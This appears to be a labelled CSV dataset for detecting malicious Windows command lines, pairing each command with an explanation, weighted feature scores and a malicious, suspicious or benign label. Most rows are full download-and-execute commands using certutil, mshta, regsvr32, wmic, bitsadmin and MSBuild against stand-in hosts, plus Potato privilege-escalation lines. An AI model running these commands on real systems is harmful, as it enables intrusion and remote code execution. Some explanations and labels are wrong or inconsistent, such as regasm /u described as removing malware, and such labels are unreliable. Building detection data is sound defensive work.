prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll,"This command can be used to load a malicious DLL as a plugin on a DNS server, allowing an attacker to intercept and manipulate DNS traffic.",dnscmd,\\Path\To\Our\Dll\malicious.dll,none,\\Path\To\Our\Dll\malicious.dll,none,"/config,/serverlevelplugindll",none,0.65,malicious
"powershell Get-SQLServerLinkCrawl -Instace <SPN> -Query ""exec master..xp_cmdshell 'whoami'""","This command can be used to crawl SQL Server links and execute a command to run the ""whoami"" command on the target machine, potentially revealing the current user context of the compromised machine.",powershell,"exec master..xp_cmdshell 'whoami'""",none,none,none,"Get-SQLServerLinkCrawl,-Instace",none,0.55,suspicious
whoami /all,"Displays the security context of the current user including the security identifiers (SIDs) and group membership, which can be useful for privilege escalation and lateral movement.",none,whoami,none,none,none,/all,none,0.45,suspicious
.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002,This command can be used to exploit a vulnerability in Windows to escalate privileges and execute a malicious executable file with SYSTEM level permissions.,JuicyPotato.exe,c:\path\to\executable.bat,none,.\JuicyPotato.exe,9002,"-t,-p,-l",none,0.7,malicious
.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002 -c '{CLSID}',This command can be used to execute a malicious executable with elevated privileges by exploiting the Windows Component Object Model (COM) and impersonating a privileged user.,JuicyPotato.exe,c:\path\to\executable.bat,none,.\JuicyPotato.exe,9002,"-t,-p,-l,-c",none,0.7,malicious
".\RoguePotato.exe -r 10.10.14.9 -e ""cmd.exe /c ping 10.10.14.9"" -l 9999","This command can be used to execute a reverse shell and establish a connection with the attacker's machine, allowing them to execute arbitrary commands on the compromised machine and potentially exfiltrate data.",RoguePotato.exe,cmd.exe,none,none,"10.10.14.9,9999","-r,-e",none,0.6,malicious
powershell powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1,"This command imports a PowerShell script called Sherlock.ps1 from the specified file path, which could be used to search for vulnerabilities and misconfigurations on a Windows machine during a cyberattack.",powershell,C:\Users\Rasta\Desktop\Sherlock.ps1,none,none,none,powershell-import,none,0.55,suspicious
\.Watson.exe,"Potential use in a cyberattack: None, it is a legitimate Windows process used for error reporting.
What it might do on a Windows machine: It is responsible for collecting and sending error reports to Microsoft.",Watson.exe,none,none,none,none,none,none,0.05,benign
powershell Invoke-WebRequest -OutFile index.html -Uri https://superuser.com,"This command can be used to download a webpage and save it as a file on the local machine, potentially allowing an attacker to gather information about the target's browsing habits or steal sensitive information entered on the webpage.",powershell,index.html,none,https://superuser.com,none,"Invoke-WebRequest,-OutFile",none,0.65,malicious
powershell Invoke-WebRequest -OutFile index.html -Uri https://11.10.10.1,"This command can be used to download a file from a remote server and save it locally on the compromised machine, potentially allowing an attacker to exfiltrate sensitive data or install malware.",powershell,index.html,none,https://11.10.10.1,11.10.10.1,"Invoke-WebRequest,-OutFile",none,0.75,malicious
powershell iwr -outf index.html https://11.101.0.1,"This command downloads the HTML content of a webpage from the specified IP address and saves it as a file named ""index.html"" - it could be used to download malicious code or instructions from a remote server.",powershell,index.html,none,https://11.10.10.1,11.10.10.1," iwr,-outf",none,0.75,malicious
bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to download and execute malicious code on the victim's machine.",bitsadmin,c:\10mb.zip,none,http://downloadsrv/10mb.zip,none,"/transfer,/download,/priority",none,0.65,malicious
bitsadmin /transfer myDownloadJob /download /priority normal http://11.10.10.10/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to exfiltrate sensitive data from the victim's machine.",bitsadmin,c:\10mb.zip,none, http://11.11.11.11/10mb.zip,11.11.11.11,"/transfer,/download,/priority",none,0.75,malicious
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10/10mb.zip c:\10mb.zip,"This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to exfiltrate sensitive data from the victim machine.",bitsadmin,c:\10mb.zip,none, http://10.10.10.10/10mb.zip,10.10.10.10,"/transfer,/download,/priority",none,0.75,malicious
"certutil.exe -urlcache -split -f ""https://10.10.10.10/files/PSTools.zip"" pstools.zip","This command downloads and caches a file from a remote server, which could be used to deliver malicious payloads or tools for lateral movement.",certutil.exe,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"-urlcache,-split,-f",none,0.75,malicious
"certutil.exe -urlcache -split -f ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","This command downloads and caches the PSTools.zip file from a remote server, which could be used to execute remote commands and potentially escalate privileges on a compromised machine.",certutil.exe,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"-urlcache,-split,-f",none,0.65,malicious
"certutil.exe -urlcache -split -f ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","This command can be used to download and cache a malicious file from a remote server, potentially allowing an attacker to execute malicious code on the compromised machine using the PSTools utility.",certutil.exe,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"-urlcache,-split,-f",none,0.75,malicious
"call bitsDownloader.bat ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server using BITS (Background Intelligent Transfer Service) and execute a batch file, potentially allowing an attacker to download and execute malicious files on a compromised machine.",none,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"call,bitsDownloader.bat",none,0.6,malicious
"call bitsDownloader.bat ""https://10.10.10.10/files/PSTools.zip"" pstools.zip",This command can be used to download a file from a remote server using BITS (Background Intelligent Transfer Service) and can be used to download malicious files or tools onto a compromised machine.,none,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"call,bitsDownloader.bat",none,0.7,malicious
"call bitsDownloader.bat ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","Potential use in a cyberattack: Downloading and executing malicious files from a remote server using Background Intelligent Transfer Service (BITS) to evade detection.

What it does on a Windows machine: Calls a batch file to download a file from a specified URL using BITS and saves it as ""pstools.zip"".",none,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"call,bitsDownloader.bat",none,0.7,malicious
"call winhhtpjs.bat ""https://example.com/files/some.zip"" -saveTo ""c:\somezip.zip""","Potential use in a cyberattack: Downloading and executing malicious code from a remote server.

What it might do on a Windows machine: Downloads a file from a specified URL and saves it to a specified location on the local machine.",none,c:\somezip.zip,none,https://example.com/files/some.zip,none,"call,winhhtpjs.bat",none,0.6,malicious
"call winhhtpjs.bat ""https://10.10.10.10/files/some.zip"" -saveTo ""c:\somezip.zip""","This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to download and execute malicious code on the victim's machine.",none,c:\somezip.zip,none,https://10.10.10.10/files/some.zip,10.10.10.10,"call,winhhtpjs.bat",none,0.7,malicious
"call winhhtpjs.bat ""https://11.11.11.11/files/some.zip"" -saveTo ""c:\somezip.zip""","Potential use in a cyberattack: Downloading and saving a malicious file from a remote server to the victim's machine.
What it does on a Windows machine: Executes a batch file to call the Windows HTTP JavaScript file to download a file from a specified URL and save it to a specified location on the local machine.",none,c:\somezip.zip,none,https://11.11.11.11/files/some.zip,11.11.11.11,"call,winhhtpjs.bat",none,0.7,malicious
"call XMLHTTPDownloadJS.bat ""https://download.sysinternals.com/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, which can be useful for delivering malicious payloads or downloading additional tools for the attacker to use.",none,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"call,XMLHTTPDownloadJS.bat",none,0.6,malicious
"call XMLHTTPDownloadJS.bat ""https://10.10.10.10/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, which can be useful for downloading malicious payloads or tools for lateral movement.",none,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"call,XMLHTTPDownloadJS.bat",none,0.7,malicious
"call XMLHTTPDownloadJS.bat ""https://11.11.11.11/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a zip file from a remote server and save it on the local machine, potentially for use in a later stage of the attack.",none,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"call,XMLHTTPDownloadJS.bat",none,0.7,malicious
"call webclientDownload.bat ""https://download.sysinternals.com/files/PSTools.zip"" pstools.zip","Potential use: Downloading and executing malicious tools or payloads from a remote server.

What it does: Downloads the PSTools.zip file from the specified URL using the webclientDownload.bat script.",none,pstools.zip,none,https://download.sysinternals.com/files/PSTools.zip,none,"call,webclientDownload.bat",none,0.6,malicious
"call webclientDownload.bat ""https://10.10.10.10/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, potentially allowing an attacker to download and execute malicious files on the victim's machine.",none,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"call,webclientDownload.bat",none,0.7,malicious
"call webclientDownload.bat ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, potentially allowing an attacker to execute malicious code or tools.",none,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"call,webclientDownload.bat",none,0.7,malicious
powershell $client = New-Object -TypeName System.Net.Http.Httpclient,"This command can be used to create a new HTTP client object in PowerShell, which can be used to send HTTP requests to a server, potentially for exfiltration of data or remote code execution.",powershell,System.Net.Http.Httpclient,none,none,none,New-Object,none,0.55,suspicious
powershell [io.file]::WriteAllBytes($file,"This command can be used to write arbitrary bytes to a file, potentially allowing an attacker to modify or corrupt important system files on a Windows machine.",powershell,$file,none,none,none,WriteAllBytes,none,0.55,suspicious
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex""","This command can be used to download and execute a PowerShell script from a remote server using the default network credentials, allowing an attacker to execute arbitrary code on the compromised machine.",powershell,New-Object Net.WebClient,none,http://webserver/payload.ps1,none,"-exec,bypass,-c",none,0.65,malicious
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/payload.ps1')|iex""","This command downloads and executes a PowerShell script from a remote server using the default network credentials, potentially allowing an attacker to execute arbitrary code on the compromised machine.",powershell,New-Object Net.WebClient,none,http://10.10.10.10/payload.ps1,10.10.10.10,"-exec,bypass,-c",none,0.75,malicious
"powershell -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://11.11.11.11/payload.ps1')|iex""","This command downloads and executes a PowerShell script from a remote server using the default network credentials, potentially allowing an attacker to execute arbitrary code on the compromised machine.",powershell,New-Object Net.WebClient,none,http://11.11.11.11/payload.ps1,11.11.11.11,"-exec,bypass,-c",none,0.75,malicious
cmd.exe /k < \\webdavserver\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote WebDAV server, potentially allowing an attacker to execute malicious code on a compromised machine.",cmd.exe,\\webdavserver\folder\batchfile.txt,none,\\webdavserver\folder\batchfile.txt,none,/k,none,0.65,malicious
cmd.exe /k < \\11.11.11.11\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote machine, potentially allowing an attacker to execute malicious code on the target machine.",cmd.exe,\\11.11.11.11\folder\batchfile.txt,none,\\11.11.11.11\folder\batchfile.txt,11.11.11.11,/k,none,0.75,malicious
cmd.exe /k < \\10.10.10.10\folder\batchfile.txt,"This command can be used to execute a batch file located on a remote machine, potentially allowing an attacker to run malicious code on the target machine.",cmd.exe,\\10.10.10.10\folder\batchfile.txt,none,\\10.10.10.10\folder\batchfile.txt,10.10.10.10,/k,none,0.75,malicious
cscript //E:jscript \\webdavserver\folder\payload.txt,"This command can be used to execute a JScript payload stored in a remote WebDAV server, allowing an attacker to remotely execute code on a Windows machine.",cscript,\\webdavserver\folder\payload.txt,none,\\webdavserver\folder\payload.txt,none,//E:jscript,none,0.65,malicious
cscript //E:jscript \\10.10.10.10\folder\payload.txt,"This command can be used to execute a JScript payload located in a remote folder on a Windows machine, potentially allowing an attacker to gain remote access or execute arbitrary code.",cscript,\\10.10.10.10\folder\payload.txt,none,\\10.10.10.10\folder\payload.txt,10.10.10.10,//E:jscript,none,0.75,malicious
cscript //E:jscript \\11.11.11.11\folder\payload.txt,This command can be used to execute a malicious payload stored in a remote location on a Windows machine using Windows Script Host.,cscript,\\11.11.11.11\folder\payload.txt,none,\\11.11.11.11\folder\payload.txt,11.11.11.11,//E:jscript,none,0.75,malicious
"mshta vbscript:Close(Execute(""GetObject(""""script:http://webserver/payload.sct"""")""))",This command can be used to execute a VBScript payload hosted on a remote web server and can be used for downloading and executing malicious code on a Windows machine.,mshta ,http://webserver/payload.sct,none,http://webserver/payload.sct,none,"Execute,GetObject",none,0.65,malicious
"mshta vbscript:Close(Execute(""GetObject(""""script:http://10.10.10.10/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the victim's machine.",mshta ,http://10.10.10.10/payload.sct,none,http://10.10.10.10/payload.sct,10.10.10.10,"Execute,GetObject",none,0.75,malicious
"mshta vbscript:Close(Execute(""GetObject(""""script:http://11.11.11.11/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to execute arbitrary code on the victim's machine using a trusted Windows utility (mshta.exe).",mshta ,http://11.11.11.11/payload.sct,none,http://11.11.11.11/payload.sct,11.11.11.11,"Execute,GetObject",none,0.75,malicious
mshta http://11.11.11.11/payload.hta,"This command can be used to execute a malicious payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the victim's machine.",mshta ,http://11.11.11.11/payload.hta,none,http://11.11.11.11/payload.hta,11.11.11.11,none,none,0.65,malicious
mshta http://10.10.10.10/payload.hta,This command can be used to execute a malicious payload hosted on a remote server via HTA (HTML Application) on a Windows machine.,mshta ,http://10.10.10.10/payload.hta,none,http://10.10.10.10/payload.hta,10.10.10.10,none,none,0.65,malicious
mshta http://webserver/payload.hta,"This command can be used to execute a malicious payload hosted on a remote server, allowing an attacker to gain remote access or execute arbitrary code on the victim's machine.",mshta ,http://webserver/payload.hta,none,http://webserver/payload.hta,none,none,none,0.55,suspicious
cscript.exe //E:jscript \\webdavserver\folder\payload.txt,"This command can be used to execute a malicious payload stored in a remote WebDAV server using JScript, allowing an attacker to remotely execute code on a Windows machine.",cscript.exe,\\webdavserver\folder\payload.txt,none,\\webdavserver\folder\payload.txt,none,//E:jscript,none,0.65,malicious
cscript.exe //E:jscript \\10.10.10.10\folder\payload.txt,This command can be used to execute a malicious payload written in JScript from a remote location on a Windows machine.,cscript.exe,\\10.10.10.10\folder\payload.txt,none,\\10.10.10.10\folder\payload.txt,10.10.10.10,//E:jscript,none,0.75,malicious
cscript.exe //E:jscript \\11.11.11.11\folder\payload.txt,"This command can be used to execute a malicious payload stored in a remote location, allowing an attacker to remotely control the compromised machine.",cscript.exe,\\11.11.11.11\folder\payload.txt,none,\\11.11.11.11\folder\payload.txt,11.11.11.11,//E:jscript,none,0.75,malicious
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://webserver/payload.sct"""")""))",This command can be used to execute a VBScript payload hosted on a remote server and can be used to download and execute malicious code on a Windows machine.,mshta.exe,http://webserver/payload.sct,none,http://webserver/payload.sct,none,"Execute,GetObject",none,0.65,malicious
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://10.10.10.10/payload.sct"""")""))","This command can be used to execute a remote script on a victim's machine using mshta.exe, potentially allowing an attacker to download and execute malicious code.",mshta.exe,http://10.10.10.10/payload.sct,none,http://10.10.10.10/payload.sct,10.10.10.10,"Execute,GetObject",none,0.75,malicious
"mshta.exe vbscript:Close(Execute(""GetObject(""""script:http://11.11.11.11/payload.sct"""")""))","This command can be used to execute a VBScript payload hosted on a remote server, potentially allowing an attacker to gain remote access or execute arbitrary code on the compromised machine using the Windows HTA engine.",mshta.exe,http://11.11.11.11/payload.sct,none,http://11.11.11.11/payload.sct,11.11.11.11,"Execute,GetObject",none,0.75,malicious
mshta.exe http://11.11.11.11/payload.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to gain remote access to the victim's machine.",mshta.exe,http://11.11.11.11/payload.hta,none,http://11.11.11.11/payload.hta,11.11.11.11,none,none,0.65,malicious
mshta.exe http://10.10.10.10/payload.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to gain remote access to a Windows machine.",mshta.exe,http://10.10.10.10/payload.hta,none,http://10.10.10.10/payload.hta,10.10.10.10,none,none,0.65,malicious
mshta.exe http://webserver/payload.hta,"This command can be used to execute a malicious payload hosted on a remote web server, potentially allowing an attacker to gain remote access to the compromised machine.",mshta.exe,http://webserver/payload.hta,none,http://webserver/payload.hta,none,none,none,0.55,suspicious
rundll32 \\webdavserver\folder\payload.dll,This command can be used to execute a malicious payload stored in a remote WebDAV server on a Windows machine.,rundll32 ,\\webdavserver\folder\payload.dll,none,\\webdavserver\folder\payload.dll,none,none,none,0.55,suspicious
rundll32 \\19.19.19.19\folder\payload.dll,This command can be used to execute a malicious payload stored in a remote location on a Windows machine.,rundll32 ,\\19.19.19.19\folder\payload.dll,none,\\19.19.19.19\folder\payload.dll,19.19.19.19,none,none,0.65,malicious
rundll32 \\10.10.10.10\folder\payload.dll,"This command can be used to execute a malicious payload stored in a remote location on a network share, allowing an attacker to remotely execute code on a Windows machine.",rundll32 ,\\10.10.10.10\folder\payload.dll,none,\\10.10.10.10\folder\payload.dll,10.10.10.10,none,none,0.65,malicious
rundll32.exe \\webdavserver\folder\payload.dll,"This command can be used to execute a malicious payload stored on a remote server via WebDAV, allowing an attacker to remotely execute code on a Windows machine.",rundll32.exe,\\webdavserver\folder\payload.dll,none,\\webdavserver\folder\payload.dll,none,none,none,0.55,suspicious
rundll32.exe \\19.19.19.19\folder\payload.dll,"This command can be used to execute a payload DLL file located on a remote server, potentially allowing an attacker to gain unauthorized access or execute malicious code on the target machine.",rundll32.exe,\\19.19.19.19\folder\payload.dll,none,\\19.19.19.19\folder\payload.dll,19.19.19.19,none,none,0.65,malicious
rundll32.exe \\10.10.10.10\folder\payload.dll,"This command can be used to execute a malicious payload stored in a remote location on a network share, allowing an attacker to remotely execute code on a Windows machine.",rundll32.exe,\\10.10.10.10\folder\payload.dll,none,\\10.10.10.10\folder\payload.dll,10.10.10.10,none,none,0.65,malicious
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,\..\mshtml,none,\..\mshtml,none,javascript,none,0.65,malicious
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,\..\mshtml,none,\..\mshtml,none,javascript,none,0.65,malicious
"rundll32.exe javascript:""\..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,\..\mshtml,none,\..\mshtml,none,javascript,none,0.65,malicious
"wmic os get /format:""https://webserver/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a compromised machine.,wmic,https://webserver/payload.xsl,none,https://webserver/payload.xsl,none,"get,/format",none,0.65,malicious
"wmic os get /format:""https://10.10.10.10/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a Windows machine.,wmic,https://10.10.10.10/payload.xsl,none,https://10.10.10.10/payload.xsl,10.10.10.10,"get,/format",none,0.75,malicious
"wmic os get /format:""https://11.11.11.11/payload.xsl""",This command can be used to download and execute a payload from a remote server using Windows Management Instrumentation Command-line (WMIC) on a compromised machine.,wmic,https://11.11.11.11/payload.xsl,none,https://11.11.11.11/payload.xsl,11.11.11.11,"get,/format",none,0.75,malicious
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll,This command can be used to unregister a malicious .dll payload hosted on a remote webdav server from a Windows machine.,regasm.exe,\\webdavserver\folder\payload.dll,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe,none,/u,none,0.65,malicious
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\11.11.11.11\folder\payload.dll,This command uninstalls a .NET assembly from a remote machine and could be used to remove a malicious payload from a compromised system.,regasm.exe,\\11.11.11.11\folder\payload.dll,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe,11.11.11.11,/u,none,0.75,malicious
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\10.10.10.10\folder\payload.dll,This command uninstalls a .NET assembly from a remote machine and can be used to remove a malicious payload from a compromised system.,regasm.exe,\\10.10.10.10\folder\payload.dll,none,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe,10.10.10.10,/u,none,0.75,malicious
regasm /u \\webdavserver\folder\payload.dll,"This command can be used to unregister a malicious .dll payload hosted on a remote WebDAV server, potentially used in a living off the land attack, from a Windows machine.",regasm,\\webdavserver\folder\payload.dll,none,\\webdavserver\folder\payload.dll,none,/u,none,0.65,malicious
regasm /u \\11.11.11.11\folder\payload.dll,"This command can be used to unregister a malicious .dll payload from a remote machine, potentially removing the attacker's foothold on the system.",regasm,\\11.11.11.11\folder\payload.dll,none,\\11.11.11.11\folder\payload.dll,11.11.11.11,/u,none,0.75,malicious
regasm /u \\10.10.10.10\folder\payload.dll,This command can be used to unregister a .NET assembly and potentially remove a malicious payload from a compromised system.,regasm,\\10.10.10.10\folder\payload.dll,none,\\10.10.10.10\folder\payload.dll,10.10.10.10,/u,none,0.75,malicious
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll,This command can be used to execute a malicious payload hosted on a web server by unregistering a legitimate DLL file and replacing it with the malicious payload.,regsvr32,scrobj.dll,none,http://webserver/payload.sct,none,"/u,/n,/s,/i",none,0.65,malicious
regsvr32 /u /n /s /i:http://10.10.10.10/payload.sct scrobj.dll,"This command can be used to unregister a DLL file while simultaneously executing a remote script hosted on a web server, potentially allowing an attacker to execute arbitrary code on the victim machine.",regsvr32 ,scrobj.dll,none,http://10.10.10.10/payload.sct,10.10.10.10,"/u,/n,/s,/i",none,0.75,malicious
regsvr32 /u /n /s /i:http://11.11.11.11/payload.sct scrobj.dll,"This command can be used to unregister a DLL file and register a new one from a remote server, potentially allowing an attacker to execute malicious code on the target machine.",regsvr32 ,scrobj.dll,none,http://11.11.11.11/payload.sct,11.11.11.11,"/u,/n,/s,/i",none,0.75,malicious
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt},This command can be used to register a malicious DLL payload on a remote webdav server and execute it on a target machine using ODBC data sources.,odbcconf,\\webdavserver\folder\payload_dll.txt,none,\\webdavserver\folder\payload_dll.txt,none,"/s,/a,regsvr",none,0.65,malicious
odbcconf /s /a {regsvr \\10.10.10.10\folder\payload_dll.txt},"This command can be used to register a malicious DLL file on a remote machine through ODBC configuration, allowing for persistence and potential privilege escalation.",odbcconf,\\10.10.10.10\folder\payload_dll.txt,none,\\10.10.10.10\folder\payload_dll.txt,10.10.10.10,"/s,/a,regsvr",none,0.75,malicious
odbcconf /s /a {regsvr \\11.11.11.11\folder\payload_dll.txt},"This command can be used to register a malicious DLL file on a remote machine via ODBC, allowing for persistence and potential privilege escalation.",odbcconf,\\11.11.11.11\folder\payload_dll.txt,none,\\11.11.11.11\folder\payload_dll.txt,11.11.11.11,"/s,/a,regsvr",none,0.75,malicious
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote WebDAV server, potentially allowing an attacker to download and execute malicious code on the target Windows machine.",cmd,\\webdavserver\folder\payload.xml,payload.xml,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,none,"/V,/c,set",none,0.85,malicious
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\10.10.10.10\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote server, potentially allowing an attacker to execute arbitrary code on the target machine.",cmd,\\10.10.10.10\folder\payload.xml,payload.xml,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,10.10.10.10,"/V,/c,set",none,0.95,malicious
"cmd /V /c ""set MB=""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"" & !MB! /noautoresponse /preprocess \\11.11.11.11\folder\payload.xml > payload.xml & !MB! payload.xml""","This command can be used to execute a payload.xml file from a remote server, potentially allowing an attacker to execute malicious code on the target machine.",cmd, \\11.11.11.11\folder\payload.xml,payload.xml,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe,11.11.11.11,"/V,/c,set",none,0.95,malicious
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command can be used to download and execute a payload from a remote server, and then use InstallUtil to install and execute the payload as a Windows service.",certutil,payload.b64,payload.dll,http://webserver/payload.b64,none,"-urlcache,-split,-f",none,0.85,malicious
certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command downloads a base64-encoded payload from a remote server, decodes it, and installs it as a DLL using the .NET Framework's InstallUtil utility, potentially allowing an attacker to execute arbitrary code on the compromised machine.",certutil,payload.b64,payload.dll,http://10.10.10.10/payload.b64,10.10.10.10,"-urlcache,-split,-f",none,0.95,malicious
certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll,"This command downloads a payload from a remote server, decodes it, and installs it as a Windows service using InstallUtil, potentially allowing for persistent access to the compromised system.",certutil,payload.b64,payload.dll,http://11.11.11.11/payload.b64,11.11.11.11,"-urlcache,-split,-f",none,0.95,malicious
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe,"This command downloads a base64-encoded payload from a web server, decodes it, and executes it as an executable file, making it useful for delivering and executing malicious payloads in a cyberattack.",certutil,payload.b64,payload.exe,http://webserver/payload.b64,none,"-urlcache,-split,-f,-decode",none,0.85,malicious
certutil -urlcache -split -f http://10.10.10.10/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe,"This command downloads a base64-encoded payload from a remote server, decodes it, and executes it as an executable file, which could be used to deliver and execute malware on a target machine.",certutil,payload.b64,payload.exe,http://10.10.10.10/payload.b64,10.10.10.10,"-urlcache,-split,-f,-decode",none,0.95,malicious
certutil -urlcache -split -f http://11.11.11.11/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe,"This command downloads a base64-encoded payload from a remote server, decodes it, and executes it as an executable file, which could be used to deliver and execute malware on a target machine.",certutil,payload.b64,payload.exe,http://11.11.11.11/payload.b64,11.11.11.11,"-urlcache,-split,-f,-decode",none,0.95,malicious
